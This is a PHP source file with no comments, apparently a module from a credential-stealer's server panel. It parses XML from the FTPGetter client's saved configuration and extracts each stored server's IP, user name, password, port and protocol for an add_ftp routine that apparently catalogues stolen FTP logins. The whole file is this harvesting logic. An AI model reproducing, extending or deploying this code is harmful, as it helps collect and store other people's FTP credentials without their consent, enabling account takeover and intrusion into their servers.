<?php
class Module_ftpgetter extends Module_
{
    protected function ProcessFTPGetter($Data)
    {
        $XML_ = simplexml_load_string($Data);
		if(!$XML_)
			return;
		
        $this->ProcessItems($XML_);
        $XML_ = NULL;
    }

    protected function ProcessItem($Element)
    {
		$Host = Assign_($Element->server_ip);
		$User = Assign_($Element->server_user_name);
		$Pass = Assign_($Element->server_user_password);
		$Port = Assign_($Element->server_port);
		$Prot = Assign_($Element->protocol_type);

		$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == '3'), $Port), $User, $Pass);
    }
	
    protected function ProcessItems($Elements)
    {
        if(isset($Elements->server_ip))
        {
            $this->ProcessItem($Elements);
            return;
        }
		
        foreach($Elements->children() as $Element)
        {
            if(isset($Element->server_ip))
                $this->ProcessItem($Element);
            else
            {
                if(!empty($Element))
                    $this->ProcessItems($Element);
            }
        }
    }
	
    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessFTPGetter($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}

